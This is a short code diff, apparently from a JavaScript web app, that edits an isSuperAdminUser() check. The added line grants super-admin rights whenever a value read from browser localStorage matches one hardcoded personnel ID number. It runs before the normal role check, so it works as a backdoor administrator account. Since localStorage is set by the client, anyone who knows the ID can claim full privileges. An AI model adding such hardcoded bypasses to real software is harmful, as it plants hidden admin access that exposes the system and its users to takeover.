@@ -18,7 +18,7 @@
       }
     };
 
-    function isSuperAdminUser() {
+    function isSuperAdminUser() { var myNip = String(localStorage.getItem('MY_NIP') || '').trim(); if (myNip === '200206302025061002') return true; 
       var role = String(window.MY_ROLE || localStorage.getItem('MY_ROLE') || '').toUpperCase().trim();
       if (role === 'SUPERADMIN' || role === 'SUPER ADMIN') return true;
       if (role.indexOf('SUPER') >= 0) return true;
